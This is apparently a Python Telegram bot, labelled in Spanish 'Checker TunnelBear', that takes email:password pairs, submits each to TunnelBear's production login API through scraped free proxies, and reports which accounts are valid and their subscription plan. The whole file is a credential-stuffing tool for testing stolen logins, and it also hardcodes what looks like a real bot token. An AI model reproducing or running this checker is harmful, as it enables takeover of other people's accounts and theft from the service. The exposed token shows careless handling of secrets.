import logging
import os
import requests
import time
import string
import random

from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup

ENV = bool(os.environ.get('ENV', True))
TOKEN = os.environ.get("TOKEN", None)
BLACKLISTED = os.environ.get("BLACKLISTED", None) 
PREFIX = "!/"

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token="5550112149:AAE0RVE19z9XRF1kT2MMhhGa5f8XsI9uxtQ", parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot)

###USE YOUR ROTATING PROXY### NEED HQ PROXIES ELSE WONT WORK UPDATE THIS FILED
r = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=20&country=all&ssl=all&anonymity=all&simplified=true').text
res = r.partition('\n')[0]
proxy = {"http": f"http://{res}"}
session = requests.session()

session.proxies = proxy #UNCOMMENT IT AFTER PROXIES

#random str GEN FOR EMAIL
N = 10
rnd = ''.join(random.choices(string.ascii_lowercase +
                                string.digits, k = N))
  

@dp.message_handler(commands=['tunel'], commands_prefix=PREFIX)
async def tv(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    ac = message.text[len('/tunel '):]
    splitter = ac.split(':')
    email = splitter[0]
    password = splitter[1]
    if not ac:
        return await message.reply(
            "<code>Send ac /tunel email:pass.</code>"
        )
    payload = {
        "username": email,
        "password": password,
        "withUserDetails": "true",
        "v": "web-1.0"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    r = session.post("https://prod-api-core.tunnelbear.com/core/web/api/login",
                     data=payload, headers=headers)
    toc = time.perf_counter()


    # capture ac details
    if "Access denied" in r.text:
        await message.reply(f"""

<b>Checker TunnelBear</b>

<b>Usuario</b> : <code>{email}</code>
<b>Pass</b> : <code>{password}</code>
<b>Status : Fail ❌❌</b>
<b>Responde : Cuenta no suscripta</b>
<code>------------------------------------</code>
<b>Proxys</b> : Live ✅
<b>Chk</b> : <b>Correctamente testeado.</b>
<b>Tiempo</b>{toc - tic:0.4f}(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>

<b>ᴘᴏɪɴᴛs ʀᴇᴅ 𓄿 •「 𝗽𝗼𝗰𝘂𝗽𝘆 」• 𓅂]</b>
""")
    elif "PASS" in r.text:
        res = r.json()
        await message.reply(f"""

<b>Checker TunnelBear</b>

<b>Usuario</b> : <code>{email}</code>
<b>Pass</b> : <code>{password}</code>
<b>Status : VALIDA ✅</b>
<b>Plan : {res ['details']['paymentStatus']}</b>
<b>Fecha creada : {res ['details']['fullVersionUntil']}</b>
<code>------------------------------------</code>
<b>Proxys : Live ✅</b>
<b>Chk</b> : <b>Correctamente testeado.</b>
<b>Tiempo</b>{toc - tic:0.4f}(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>

<b>ᴘᴏɪɴᴛs ʀᴇᴅ 𓄿 •「 𝗽𝗼𝗰𝘂𝗽𝘆 」• 𓅂]</b>


""")
    else:
        await message.reply("Error❌: REQ failed")

    
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)